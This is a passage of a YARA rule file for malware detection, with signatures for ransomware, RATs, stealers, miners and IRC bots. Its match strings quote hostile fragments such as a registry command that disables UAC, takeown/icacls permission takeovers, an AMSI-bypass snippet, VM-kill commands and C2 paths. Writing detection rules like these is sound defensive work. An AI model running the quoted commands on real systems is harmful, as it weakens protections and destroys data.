$f17 = ".(*Server).ServeConn." ascii
$f18 = ".(*TCPProxy).listen." ascii
$f19 = ".UserPassAuthenticator.Authenticate." ascii
$f20 = ".(*InfoPacket).XXX_" ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or 16 of ($f*))
}
rule SSC_Win_SilentMoon {
meta:
author = "ditekSHen"
description = "Detects SilentMoon"
strings:
$s1 = "\\\\.\\Global\\PIPE\\" fullword wide
$s2 = "REMOTE_NS:ERROR:%d" fullword ascii
$s3 = "REMOTE:ERROR:%d" fullword ascii
$s4 = "COMNAP,COMNODE,SQLQUERY,SPOOLSS,LLSRPC,browser" fullword wide
$s5 = "Mem alloc err" fullword ascii
$s6 = "block %d: crc = 0x%08x, combined CRC = 0x%08x, size = %d" ascii
$x1 = "ACTION:UNSUPPORTED" fullword ascii
$x2 = "?ServiceMain@@YAXKPAPA_W@Z" fullword ascii
$x3 = "?ServiceCtrlHandler@@YGKKKPAX0@Z" fullword ascii
$x4 = "%d socks, %d sorted, %d scanned" ascii
$x5 = "GoldenSky" fullword wide
$x6 = "SilentMoon" fullword wide
$x7 = "internalstoragerpc" fullword wide
condition:
uint16(0) == 0x5a4d and (all of ($s*) or 3 of ($x*))
}
rule SSC_Win_Lu0Bot {
meta:
author = "ditekSHen"
description = "Detects Lu0Bot"
strings:
$s1 = "WinExec" fullword ascii
$s2 = "AlignRects" fullword ascii
$o1 = { be 00 20 40 00 89 f7 89 f0 81 c7 a? 01 00 00 81 }
$o2 = { 53 50 e8 b0 01 00 00 e9 99 01 00 00 e8 ae 01 00 }
condition:
uint16(0) == 0x5a4d and filesize < 4KB and 1 of ($s*) and all of ($o*)
}
rule SSC_Win_ShellcodeDLEI {
meta:
author = "ditekSHen"
description = "Detects shellcode downloader, executer, injector"
strings:
$s1 = "PPidSpoof" fullword ascii
$s2 = "ProcHollowing" fullword ascii
$s3 = "CreateProcess" fullword ascii
$s4 = "DynamicCodeInject" fullword ascii
$s5 = "PPIDDynCodeInject" fullword ascii
$s6 = "MapAndStart" fullword ascii
$s7 = "PPIDAPCInject" fullword ascii
$s8 = "PPIDDLLInject" fullword ascii
$s9 = "CopyShellcode" fullword ascii
$s10 = "GetEntryFromBuffer" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 5 of ($s*)
}
rule SSC_Win_BlueBot {
meta:
author = "ditekSHen"
description = "Detects BlueBot"
strings:
$x1 = "Blue_Botnet" wide
$x2 = "5-START-http" ascii
$x3 = "*300-END-" ascii
$x4 = "botlogger.php" wide
$s1 = "//TARGET//" wide
$s2 = "//BLOG//" wide
$s3 = "MCBOTALPHA" wide
$s4 = "//IPLIST//" wide
$s5 = "Host: //BLOG//" wide
$s6 = "User-Agent: //USERAGENT//" wide
$s7 = "<string>//TARGET//</string>" wide
$s8 = "POST //URL// HTTP/1.1/r/n" wide
$v1 = "<attack>b__" ascii
$v2 = "PressData" fullword ascii
$v3 = "POSTPiece" fullword ascii
$v4 = /(load|tcp|udp)Stuff/ fullword ascii
$v5 = "isAttacking" fullword ascii
$v6 = "DoSAttack" fullword ascii
$v7 = "prv_attack" fullword ascii
$v8 = "blogList"fullword ascii
condition:
uint16(0) == 0x5a4d and (2 of ($x*) or 5 of ($s*) or 5 of ($v*) or 9 of them)
}
rule SSC_Win_UNKCobaltStrike {
meta:
author = "ditekSHen"
description = "Detects unknown malware, potentially CobaltStrike related"
strings:
$s1 = "https://%hu.%hu.%hu.%hu:%u" ascii wide
$s2 = "https://microsoft.com/telemetry/update.exe" ascii wide
$s3 = "\\System32\\rundll32.exe" ascii wide
$s4 = "api.opennicproject.org" ascii wide
$s5 = "%s %s,%s %u" ascii wide
$s6 = "User32.d?" ascii wide
$s7 = "StrDupA" fullword ascii wide
$s8 = "{6d4feed8-18fd-43eb-b5c4-696ad06fac1e}" ascii wide
$s9 = "{ac41592a-3d21-46b7-8f21-24de30531656}" ascii wide
$s10 = "bd526:3b.4e32.57c8.9g32.35ef41642767~" ascii wide
$s11 = { 4b d3 91 49 a1 80 91 42 83 b6 33 28 36 6b 90 97 } // BITS
$s12 = { 0d 4c e3 5c c9 0d 1f 4c 89 7c da a1 b7 8c ee 7c } // BITS
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_EXEPWSHDL {
meta:
author = "ditekSHen"
description = "Detects executable downloaders using PowerShell"
strings:
$x1 = "[Ref].Assembly.GetType(" ascii wide
$x2 = ".SetValue($null,$true)" ascii wide
$s1 = "replace" ascii wide
$s2 = "=@(" ascii wide
$s3 = "[System.Text.Encoding]::" ascii wide
$s4 = ".substring" ascii wide
$s5 = "FromBase64String" ascii wide
$d1 = "New-Object" ascii wide
$d2 = "Microsoft.XMLHTTP" ascii wide
$d3 = ".open(" ascii wide
$d4 = ".send(" ascii wide
condition:
uint16(0) == 0x5a4d and filesize < 100KB and all of ($x*) and (3 of ($s*) or all of ($d*))
}
rule SSC_Win_MB150 {
meta:
author = "ditekSHen"
description = "Detects MB150? Go ransomware"
strings:
$x1 = /main\.evade_(clicks_count|cpu_count|disk_size|foreground_window|hostname|mac|printer|screen_size|system_memory|time_acceleration|tmp|utc)/ fullword ascii
$x2 = /main\.sandbox_(hostname|mac_addresses)/ fullword ascii
$x3 = "main.drop_ransom_note" fullword ascii
$x4 = "main.ransom_amount" fullword ascii
$x5 = "main.create_encryption_key" fullword ascii
$x6 = "main.encrypt" fullword ascii
$x7 = "main.encrypt_encryption_key" fullword ascii
$x8 = "main.encrypt_file" fullword ascii
$x9 = "main.ext_blacklist" fullword ascii
$mac1 = "00:03:FF00:05:6900:0C:2900:16:3E00:1C:1400:1C:4200:50:56" ascii nocase
$mac2 = "00-03-FF00-05-6900-0C-2900-16-3E00-1C-1400-1C-4200-50-56" ascii nocase
$mac3 = "0003FF000569000C2900163E001C14001C42005056" ascii nocase
$go = "Go build ID:" ascii
$s1 = "main.MB150" ascii
$s2 = "http://1.1.1.1" ascii
$s3 = "your personnal ID" ascii
$s4 = "ransom amount" ascii
$s5 = "binance.com" ascii
$s6 = "getmonero.org" ascii
condition:
uint16(0) == 0x5a4d and (4 of ($x*) or ($go and 4 of ($s*)) or (1 of ($mac*) and (2 of ($x*) or 3 of ($s*))))
}
rule SSC_Win_HorusEyesRAT {
meta:
author = "ditekSHen"
description = "Detects HorusEyesRAT"
strings:
$x1 = "\\HorusEyesRat-" ascii
$x2 = "\\HorusEyesRat.pdb" ascii
$x3 = "get_horus_eye" ascii
$s1 = "get_Type_Packet" fullword ascii
$s2 = "PacketLib" fullword ascii nocase
$s3 = "System.Net.Sockets" fullword ascii
$s4 = "PROCESS_MODE_BACKGROUND_BEGIN" fullword ascii
$s5 = "EXECUTION_STATE" fullword ascii
$s6 = /Plugins\\[A-Z]{2}.dll/ fullword wide
condition:
uint16(0) == 0x5a4d and (2 of ($x*) or (1 of ($x*) and 3 of ($s*)) or (4 of ($s*) and #s6 > 4))
}
rule SSC_Win_BreakWin {
meta:
author = "ditekSHen"
description = "Detects BreakWin Wiper"
strings:
$s1 = "Started wiping file %s with %s." fullword wide
$s2 = "C:\\Program Files\\Lock My PC" wide
$s3 = "Stardust is still alive." fullword wide
$s4 = "Failed to terminate the locker process." fullword wide
$s5 = "C:\\Windows\\System32\\cmd.exe" fullword wide
$s6 = "Process created successfully. Executed command: %s." fullword wide
$s7 = "locker_background_image_path" fullword ascii
$s8 = "takeown.exe /F \"C:\\Windows\\Web\\Screen\" /R /A /D Y" fullword ascii
$s9 = "icacls.exe \"C:\\Windows\\Web\\Screen\" /reset /T" fullword ascii
$s10 = "takeown.exe /F \"C:\\ProgramData\\Microsoft\\Windows\\SystemData\" /R /A /D Y" fullword ascii
$s11 = ".?AVProcessSnapshotCreationFailedException@@" fullword ascii
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_zgRAT {
meta:
author = "ditekSHen"
description = "Detects zgRAT"
strings:
$s1 = "file:///" fullword wide
$s2 = "{11111-22222-10009-11112}" fullword wide
$s3 = "{11111-22222-50001-00000}" fullword wide
$s4 = "get_Module" fullword ascii
$s5 = "Reverse" fullword ascii
$s6 = "BlockCopy" fullword ascii
$s7 = "ReadByte" fullword ascii
$s8 = { 4c 00 6f 00 63 00 61 00 74 00 69 00 6f 00 6e 00
00 0b 46 00 69 00 6e 00 64 00 20 00 00 13 52 00
65 00 73 00 6f 00 75 00 72 00 63 00 65 00 41 00
00 11 56 00 69 00 72 00 74 00 75 00 61 00 6c 00
20 00 00 0b 41 00 6c 00 6c 00 6f 00 63 00 00 0d
57 00 72 00 69 00 74 00 65 00 20 00 00 11 50 00
72 00 6f 00 63 00 65 00 73 00 73 00 20 00 00 0d
4d 00 65 00 6d 00 6f 00 72 00 79 00 00 0f 50 00
72 00 6f 00 74 00 65 00 63 00 74 00 00 0b 4f 00
70 00 65 00 6e 00 20 00 00 0f 50 00 72 00 6f 00
63 00 65 00 73 00 73 00 00 0d 43 00 6c 00 6f 00
73 00 65 00 20 00 00 0d 48 00 61 00 6e 00 64 00
6c 00 65 00 00 0f 6b 00 65 00 72 00 6e 00 65 00
6c 00 20 00 00 0d 33 00 32 00 2e 00 64 00 6c 00
6c }
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_CoinMiner03 {
meta:
author = "ditekSHen"
description = "Detects coinmining malware"
strings:
$s1 = "UnVzc2lhbiBTdGFuZGFyZCBUaW1l" wide
$s2 = "/xmrig" wide
$s3 = "/gminer" wide
$s4 = "-o {0} -u {1} -p {2} -k --cpu-priority 0 --threads={3}" wide
$s5 = "--algo ethash --server" wide
$s6 = "--algo kawpow --server" wide
$cnc1 = "/delonl.php?hwid=" fullword wide
$cnc2 = "/gateonl.php?hwid=" fullword wide
$cnc3 = "&cpuname=" fullword wide
$cnc4 = "&gpuname=" fullword wide
$cnc5 = "{0}/gate.php?hwid={1}&os={2}&cpu={3}&gpu={4}&dateinstall={5}&gpumem={6}" fullword wide
$cnc6 = "/del.php?hwid=" fullword wide
$f1 = "<StartGpuethGminer>b__" ascii
$f2 = "<StartGpuetcGminer>b__" ascii
$f3 = "<StartGpurvnGminer>b__" ascii
condition:
uint16(0) == 0x5a4d and (3 of ($cnc*) or (2 of ($f*) and (1 of ($s*) or 1 of ($f*))) or all of ($f*) or 5 of ($s*))
}
rule SSC_Win_SlackBot {
meta:
author = "ditekSHen"
description = "Detects SlackBot"
strings:
$x1 = "lp0o4bot v" ascii
$x2 = "slackbot " ascii
$s1 = "cpu: %lumhz %s, uptime: %u+%.2u:%.2u, os: %s" fullword ascii
$s2 = "%s, running for %u+%.2u:%.2u" fullword ascii
$s3 = "PONG :%s" fullword ascii
$s4 = "PRIVMSG %s :%s" fullword ascii
$s5 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)" fullword ascii
$m1 = "saving %s to %s" ascii
$m2 = "visit number %u failed" ascii
$m3 = "sending %s packets of %s bytes to %s with a delay of %s" ascii
$m4 = "file executed" ascii
$m5 = "packets sent" ascii
$m6 = "upgrading to %s" ascii
$m7 = "rebooting..." ascii
$c1 = "!@remove" fullword ascii
$c2 = "!@restart" fullword ascii
$c3 = "!@reboot" fullword ascii
$c4 = "!@rndnick" fullword ascii
$c5 = "!@exit" fullword ascii
$c6 = "!@sysinfo" fullword ascii
$c7 = "!@upgrade" fullword ascii
$c8 = "!@login" fullword ascii
$c9 = "!@run" fullword ascii
$c10 = "!@webdl" fullword ascii
$c11 = "!@cycle" fullword ascii
$c12 = "!@clone" fullword ascii
$c13 = "!@visit" fullword ascii
$c14 = "!@udp" fullword ascii
$c15 = "!@nick" fullword ascii
$c16 = "!@say" fullword ascii
$c17 = "!@quit" fullword ascii
$c18 = "!@part" fullword ascii
$c19 = "!@join" fullword ascii
$c20 = "!@raw" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($x*) or all of ($s*) or all of ($m*) or (10 of ($c*) and (1 of ($x*) or 3 of ($s*) or 2 of ($m*))))
}
rule SSC_Win_SweetyStealer {
meta:
author = "ditekSHen"
description = "Detects SweetyStealer"
strings:
$s1 = "SWEETY STEALER" wide
$s2 = "\\SWEETYLOG.zip" fullword wide
$s3 = "\\SWEETY STEALER\\SWEETY\\" ascii
$s4 = "\\Sweety" fullword wide
$s5 = "SWEETYSTEALER." ascii
$s6 = "in Virtual Environment, so we prevented stealing" wide
$s7 = ":purple_square:" wide
$f1 = "<GetDomainDetect>b__" ascii
$f2 = "<GetAllProfiles>b__" ascii
$f3 = "<ProcessExtraFieldZip64>b__" ascii
$f4 = "<PostExtractCommandLine>k__" ascii
condition:
uint16(0) == 0x5a4d and 3 of ($s*) or (3 of ($f*) and 1 of ($s*))
}
rule SSC_Win_GENIRCBot {
meta:
author = "ditekSHen"
description = "Detects generic IRCBots"
strings:
$s1 = "@login" ascii nocase
$s2 = "PRIVMSG" fullword ascii
$s3 = "JOIN" fullword ascii
$s4 = "PING :" fullword ascii
$s5 = "NICK" fullword ascii
$s6 = "USER" fullword ascii
$x1 = "irc.danger.net" fullword ascii nocase
$x2 = "evilBot" fullword ascii nocase
$x3 = "#evilChannel" fullword ascii nocase
condition:
uint16(0) == 0x5a4d and (all of ($s*) or 2 of ($x*))
}
rule SSC_Win_Nitro {
meta:
author = "ditekSHen"
description = "Detects Nitro Ransomware"
strings:
$x1 = ".givemenitro" wide
$x2 = "Nitro Ransomware" ascii wide
$x3 = "\\NitroRansomware.pdb" ascii
$x4 = "NitroRansomware" ascii wide nocase
$s1 = "Valid nitro code was received" wide
$s2 = "discord nitro" ascii wide nocase
$s3 = "Starting file encryption" wide
$s4 = "NR_decrypt.txt" wide
$s5 = "open it unless you have the decryption key." ascii
$s6 = "<EncryptAll>b__" ascii
$s7 = "<DecryptAll>b__" ascii
$s8 = "DECRYPT_PASSWORD" fullword ascii
$s9 = "IsEncrypted" fullword ascii
$s10 = "CmdProcess_OutputDataReceived" fullword ascii
$s11 = "encryptedFileLog" fullword ascii
$s12 = "Encrypting:" fullword wide
$s13 = "decryption key. If you do so, your files may get corrupted" ascii
condition:
uint16(0) == 0x5a4d and (3 of ($x*) or (3 of ($s*) and 1 of ($x*)) or (7 of ($s*)))
}
rule SSC_Win_Satan {
meta:
author = "ditekSHen"
description = "Detects Satan ransomware"
strings:
$s1 = "S:(ML;;NRNWNX;;;LW)" fullword wide
$s2 = "recycle.bin" fullword wide
$s3 = "tmp_" fullword wide
$s4 = "%s%08x.%s" fullword wide
$s5 = "\"%s\" %s" fullword wide
$s6 = "/c \"%s\"" fullword wide
$s7 = "Global\\" fullword wide
$s8 = "rd /S /Q \"%s\"" fullword ascii
$s9 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)" fullword ascii
$e1 = "*pdf*" fullword wide
$e2 = "*rtf*" fullword wide
$e3 = "*doc*" fullword wide
$e4 = "*docx*" fullword wide
$e5 = "*xlsx*" fullword wide
$e6 = "*pptx*" fullword wide
$e7 = "*moneywell*" fullword wide
$o1 = { 56 8d 54 24 34 b9 9e f0 ea be e8 c1 f9 ff ff 8d }
$o2 = { b9 34 f6 40 00 e8 ea 0b 00 00 85 c0 0f 84 91 }
$o3 = { 53 8d 84 24 34 01 00 00 b9 01 00 00 80 50 a1 64 }
condition:
uint16(0) == 0x5a4d and ((8 of ($s*) and 4 of ($e*)) or all of ($s*) or (all of ($e*) and 5 of ($s*)) or (all of ($o*) and 8 of them))
}
rule SSC_Linux_HelloKitty {
meta:
author = "ditekSHen"
description = "Detects Linux version of HelloKitty ransomware"
strings:
$s1 = "exec_pipe:%s" ascii
$s2 = "Error InitAPI !!!" fullword ascii
$s3 = "No Files Found !!!" fullword ascii
$s4 = "Error open log File:%s" fullword ascii
$s5 = "%ld - Files Found  " fullword ascii
$s6 = "Total VM run on host:" fullword ascii
$s7 = "error:%d open:%s" fullword ascii
$s8 = "work.log" fullword ascii
$s9 = "esxcli vm process kill" ascii
$s10 = "readdir64" fullword ascii
$s11 = "%s_%d.block" fullword ascii
$s12 = "EVP_EncryptFinal_ex" fullword ascii
$s13 = ".README_TO_RESTORE" fullword ascii
$m1 = "COMPROMISED AND YOUR SENSITIVE PRIVATE INFORMATION WAS STOLEN" ascii nocase
$m2 = "damage them without special software" ascii nocase
$m3 = "leaking or being sold" ascii nocase
$m4 = "Data will be Published and/or Sold" ascii nocase
condition:
uint16(0) == 0x457f and (6 of ($s*) or (2 of ($m*) and 2 of ($s*)) or 8 of them)
}
rule SSC_Win_BlackMatter {
meta:
author = "ditekSHen"
description = "Detects BlackMatter ransomware"
strings:
$s1 = "C:\\Windows\\System32\\*.drv" fullword wide
$s2 = "NYbr-Vk@" fullword ascii
$s3 = ":7:=:H:Q:W:\\:b:&;O;^;v;" fullword ascii
$o1 = { b0 34 aa fe c0 e2 fb b9 03 }
$o2 = { fe 00 ff 75 08 ff 75 0c ff b5 d8 fe ff ff ff b5 }
$o3 = { 6a 00 ff 75 0c ff b5 d8 fe ff ff ff b5 dc fe ff }
$o4 = { ff 75 08 ff 75 0c ff b5 d8 fe ff ff ff b5 dc fe }
$o5 = { 53 56 57 8d 85 70 ff ff ff 83 c0 0f 83 e0 f0 89 }
$o6 = { c7 85 68 ff ff ff 00 04 00 00 8b 85 6c ff ff ff }
//SOFTWARE\Microsoft\Crypt
//Volume{
//*recycle*
condition:
uint16(0) == 0x5a4d and (all of ($s*) and all of ($o*))
}
rule SSC_Win_DLInjector04 {
meta:
author = "ditekSHen"
description = "Detects downloader / injector"
strings:
$s1 = "Runner" fullword ascii
$s2 = "DownloadPayload" fullword ascii
$s3 = "RunOnStartup" fullword ascii
$a1 = "Antis" fullword ascii
$a2 = "antiVM" fullword ascii
$a3 = "antiSandbox" fullword ascii
$a4 = "antiDebug" fullword ascii
$a5 = "antiEmulator" fullword ascii
$a6 = "enablePersistence" fullword ascii
$a7 = "enableFakeError" fullword ascii
$a8 = "DetectVirtualMachine" fullword ascii
$a9 = "DetectSandboxie" fullword ascii
$a10 = "DetectDebugger" fullword ascii
$a11 = "CheckEmulator" fullword ascii
condition:
uint16(0) == 0x5a4d and ((all of ($s*) and 5 of ($a*)) or 10 of ($a*))
}
rule SSC_Win_DarkComet {
meta:
author = "ditekSHen"
description = "Detects DarkComet"
strings:
$s1 = "%s, ClassID: %s" ascii
$s2 = "%s, ProgID: \"%s\"" ascii
$s3 = "#KCMDDC51#" ascii
$s4 = "#BOT#VisitUrl" ascii
$s5 = "#BOT#OpenUrl" ascii
$s6 = "#BOT#Ping" ascii
$s7 = "#BOT#RunPrompt" ascii
$s8 = "#BOT#CloseServer" ascii
$s9 = "#BOT#SvrUninstall" ascii
$s10 = "#BOT#URLUpdate" ascii
$s11 = "#BOT#URLDownload" ascii
$s12 = /BTRESULT(Close|Download|HTTP|Mass|Open|Ping\|Respond|Run|Syn|UDP|Uninstall\|uninstall|Update|Visit)/ ascii
$s13 = "dclogs\\" fullword ascii
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_CoinMiner04 {
meta:
author = "ditekSHen"
description = "Detects coinmining malware"
strings:
$s1 = "createDll" fullword ascii
$s2 = "getTasks" fullword ascii
$s3 = "SetStartup" fullword ascii
$s4 = "loadUrl" fullword ascii
$s5 = "Processer" fullword ascii
$s6 = "checkProcess" fullword ascii
$s7 = "runProcess" fullword ascii
$s8 = "createDir" fullword ascii
$cnc1 = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0" fullword wide
$cnc2 = "?hwid=" fullword wide
$cnc3 = "?timeout=1" fullword wide
$cnc4 = "&completed=" fullword wide
$cnc5 = "/cmd.php" wide
condition:
uint16(0) == 0x5a4d and (5 of ($s*) and 1 of ($cnc*))
}
rule SSC_Win_SideWalk {
meta:
author = "ditekSHen"
description = "Detects SideWalk"
strings:
$s1 = "Decommit" fullword ascii
$s2 = "Shellc0deRunner" fullword ascii
$s3 = "shellc0de" fullword ascii
$s4 = "C:\\Windows\\System32\\msdt.exe" fullword wide
$s5 = "StartProcessWOPid" fullword ascii
$s6 = "StartProcessWithParent" fullword ascii
$m1 = "alloctype" fullword ascii
$m2 = "ThreadIoPriority" fullword ascii
$m3 = "PebAddress" fullword ascii
$m4 = "dotnet.4.x64.dll" fullword wide
$m5 = "LogonNetCredentialsOnly" fullword ascii
$m6 = "ThreadIdealProcessor" fullword ascii
$m7 = "LogonWithProfile" fullword ascii
condition:
uint16(0) == 0x5a4d and (5 of ($s*) or all of ($m*) or (11 of them))
}
rule SSC_Win_VanillaRAT {
meta:
author = "ditekSHen"
description = "Detects VanillaRAT"
strings:
$stub = "VanillaStub." ascii wide
$s1 = "Client.Send: " wide
$s2 = "Connected to chat" fullword wide
$s3 = "GetStoredPasswords" fullword wide
$s4 = "Started screen locker." fullword wide
$s5 = "[<\\MOUSE>]" fullword wide
$s6 = "YOUR SCREEN HAS BEEN LOCKED!" fullword wide
$s7 = "record recsound" fullword wide
$f1 = "<StartRemoteDestkop>d__" ascii
$f2 = "<ConnectLoop>d__" ascii
$f3 = "<Scan0>k__" ascii
$f4 = "<RemoteShellActive>k__" ascii
$f5 = "KillClient" fullword ascii
condition:
uint16(0) == 0x5a4d and (($stub and (2 of ($s*) or 2 of ($f*))) or 6 of ($s*) or all of ($f*))
}
rule SSC_Win_SectopRAT {
meta:
author = "ditekSHen"
description = "Detects SectopRAT"
strings:
$s1 = "\\\\.\\root\\cimv2:Win32_Process" wide
$s2 = "\\\\.\\root\\cimv2:CIM_DataFile.Name=" wide
$s3 = "^.*(?=Windows)" fullword wide
$s4 = "C:\\Windows\\System32\\cmd.exe" wide
$s5 = "C:\\Windows\\explorer.exe" wide
$s6 = "Disabling IE protection" wide
$s7 = "stream started succces" wide
$b1 = "/C start Firefox" wide
$b2 = "/C start chrome" wide
$b3 = "/C start iexplore" wide
$m1 = "DefWindowProc" fullword ascii
$m2 = "AuthStream" fullword ascii
$m3 = "KillBrowsers" fullword ascii
$m4 = "GetAllNetworkInterfaces" fullword ascii
$m5 = "EnumDisplayDevices" fullword ascii
$m6 = "RemoteClient.Packets" fullword ascii
$m7 = "IServerPacket" fullword ascii
$m8 = "keybd_event" fullword ascii
condition:
uint16(0) == 0x5a4d and ((5 of ($s*) and 2 of ($b*)) or all of ($s*) or (all of ($b*) and (4 of ($s*) or 5 of ($m*))))
}
rule SSC_Win_Neptune {
meta:
author = "ditekSHen"
description = "Detects Neptune keylogger / infostealer"
strings:
$x1 = "your keylogger has been freshly installed on" wide
$x2 = "Attached is a screenshot of the victim" wide
$x3 = "color: rgb(2, 84, 138);'>Project Neptune</span><br>" wide
$x4 = ">{Monitor Everything}</span><br><br>" wide
$x5 = "[First Run] Neptune" wide
$x6 = "Neptune - " wide
$s1 = "Melt" fullword wide
$s2 = "Hide" fullword wide
$s3 = "SDDate+" fullword wide
$s4 = "DelOff+" fullword wide
$s5 = "MsgFalse+" fullword wide
$s6 = "Clipboard:" fullword wide
$s7 = "information is valid and working!" wide
$s8 = ".exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f" wide
$s9 = "http://www.exampleserver.com/directfile.exe" fullword wide
condition:
uint16(0) == 0x5a4d and (2 of ($x*) or 7 of ($s*) or (1 of ($x*) and 5 of ($s*)))
}
rule SSC_Win_Tomiris {
meta:
author = "ditekSHen"
description = "Detects Tomiris"
strings:
$f1 = "main.workPath" ascii
$f2 = "main.selfName" ascii
$f3 = "main.infoServerAddr" ascii
$f4 = "main.configFileName" ascii
$s1 = "C:/Projects/go/src/Tomiris/main.go" ascii
$s2 = "C:/GO/go1.16.2/src/os/user/lookup_windows.go" ascii
$s3 = "C:\\GO\\go1.16.2" ascii
$s4 = ".html.jpeg.json.wasm.webp/p/gf/p/kk1562515" ascii
$s5 = "\" /ST 10:00alarm clockassistQueueavx512vbmi2avx512vnniwbad" ascii
$s6 = "write /TR \" Value addr= alloc base  code= ctxt: curg= free  goid  jobs= list= m->p=" ascii
$t1 = "SCHTASKS /DELETE /F /TN \"%s\"" ascii
$t2 = "SCHTASKS /CREATE /SC DAILY /TN" ascii
$t3 = "SCHTASKS /CREATE /SC ONCE /TN \"%s\" /TR \"%s\" /ST %s" ascii
$t4 = "SCHTASKS /CREATE /SC ONCE /TN \"%s\" /TR \"'%s' %s\" /ST %s" ascii
$r1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones" ascii
$r2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" ascii
condition:
uint16(0) == 0x5a4d and ((all of ($f*) and 3 of ($s*) and 2 of ($t*) and 1 of ($r*)) or (4 of ($s*) and 2 of ($t*) and 1 of ($r*)) or 12 of them)
}
rule SSC_Win_JennLog {
meta:
author = "ditekSHen"
description = "Detects JennLog loader"
strings:
$x1 = "%windir%\\system32\\rundll32.exe advapi32.dll,ProcessIdleTasks" fullword wide
$x2 = "https://fkpageintheworld342.com" fullword wide
$s1 = "ExecuteInstalledNodeAndDelete" fullword ascii
$s2 = "ProcessExsist" fullword ascii
$s3 = "helloworld.Certificate.txt" fullword wide
$s4 = "ASCII85 encoded data should begin with '" fullword wide
$s5 = "] WinRE config file path: C:\\" ascii
$s6 = "] Parameters: configWinDir: NULL" ascii
$s7 = "] Update enhanced config info is enabled." ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and 3 of ($s*)) or 5 of ($s*) or (all of ($x*) and 2 of ($s*)))
}
rule SSC_Win_LockFile {
meta:
author = "ditekSHen"
description = "Detects LockFile ransomware"
strings:
$x1 = "LOCKFILE" fullword ascii
$x2 = "25a01bb859125507013a2fe9737d3c33" fullword ascii
$s1 = "</key>" fullword ascii
$s2 = "<computername>%s</computername>" fullword ascii
$s3 = "<blocknum>%d</blocknum>" fullword ascii
$s4 = "%s\\%s-%s-%d%s" fullword ascii
$s5 = ">RAC=OQD:S>P@:AO?R:EEOS:ARDD=N?EENSB" ascii wide
$m1 = "<title>LOCKFILE</title>" ascii wide nocase
$m2 = "<hta:application id=LOCKFILE applicationName=LOCKFILE" ascii wide nocase
condition:
uint16(0) == 0x5a4d and (all of ($x*) or all of ($s*) or (1 of ($x*) and (2 of ($s*) or 1 of ($m*))) or (1 of ($m*) and (1 of ($x*) or 2 of ($s*))))
}
rule SSC_Win_HUNT_FoggyWeb {
meta:
author = "ditekSHen"
description = "Attempt on hunting FoggyWeb"
strings:
$u1 = "/adfs/portal/images/theme/light01/" ascii wide
$u2 = "/adfs/services/trust/2005/samlmixed/upload" ascii wide
$s1 = "ProcessGetRequest" ascii wide
$s2 = "ProcessPostRequest" ascii wide
$s3 = "UrlGetFileNames" ascii wide
$s4 = "GetWebpImage" ascii wide
$s5 = "GetWebpHeader" ascii wide
$s6 = "ExecuteAssemblyRoutine" ascii wide
$s7 = "ExecuteBinary" ascii wide
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_HUNT_Apostle {
meta:
author = "ditekSHen"
description = "Attempt on hunting new variants of Apostle"
strings:
$x1 = "://t.me/x4ran" ascii wide nocase
$x2 = "43JuFUyzfcKQwTzCTHpQoA8uLGtbwFBLyeeXoYEEU5dZLhLT1cZJDk4cytjcgQT7kdjSerJqpEp2gUcH91bjLcoq2bqik3j" ascii wide
condition:
any of them
}
rule SSC_Win_HUNT_GhostEmperor_RemoteControlPayload {
meta:
author = "ditekSHen"
description = "Attempt on hunting GhostEmperor Stage 4 Remote Control Payload"
reference = "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2021/09/30094337/GhostEmperor_technical-details_PDF_eng.pdf"
condition:
uint16(0) == 0x5a4d and pe.is_dll() and pe.number_of_exports == 2 and pe.exports("1") and pe.exports("__acrt_iob_func")
}
rule SSC_Win_Alkhal {
meta:
author = "ditekSHen"
description = "Detects Alkhal ransomware"
strings:
$s1 = "ReadMe.txt" fullword wide
$s2 = "Recovery.bmp" fullword wide
$d1 = "\\$RECYCLE.BIN\\" fullword wide
$d2 = "\\BOOT\\" fullword wide
$d3 = "\\RECOVERY\\" fullword wide
$d4 = "\\MICROS~1\\" fullword wide
$d5 = "\\CODECA~1\\js\\" fullword wide
$a1 = "takeown.exe" fullword wide
$a2 = "AppLaunch.exe" fullword wide
$a3 = "MpCmdRun.exe" fullword wide
$a4 = "wordpad.exe" fullword wide
$a5 = "winload.exe" fullword wide
$a6 = "prevhost.exe" fullword wide
$a7 = "credwiz.exe" fullword wide
condition:
uint16(0) == 0x5a4d and (all of ($s*) and 4 of ($d*) and 3 of ($a*))
}
rule SSC_Win_Unicorn {
meta:
author = "ditekSHen"
description = "Detects Unicorn infostealer"
strings:
$x1 = "WinHTTP Downloader/1.0" fullword wide
$x2 = "[CTRL + %c]" fullword wide
$x3 = "\\UnicornLog.txt" fullword wide
$x4 = "/*INITIALIZED*/" fullword wide
$s1 = { 2f 00 63 00 20 00 22 00 43 00 4f 00 50 00 59 00
20 00 2f 00 59 00 20 00 2f 00 42 00 20 00 22 00
25 00 73 00 22 00 20 00 22 00 25 00 73 00 22 00
22 00 00 00 63 00 6d 00 64 00 2e 00 65 00 78 00
65 }
$s2 = { 72 00 75 00 6e 00 64 00 6c 00 6c 00 33 00 32 00
2e 00 65 00 78 00 65 00 00 00 00 00 25 00 73 00
20 00 22 00 25 00 73 00 22 00 2c 00 25 00 68 00
73 }
$s3 = "%*[^]]%c%n" fullword ascii
$s4 = "file://%s%s%s" fullword ascii
$s5 = "%s://%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s" fullword ascii
$s6 = "regex_start_injects" fullword ascii
$s7 = "DLEXEC" fullword ascii
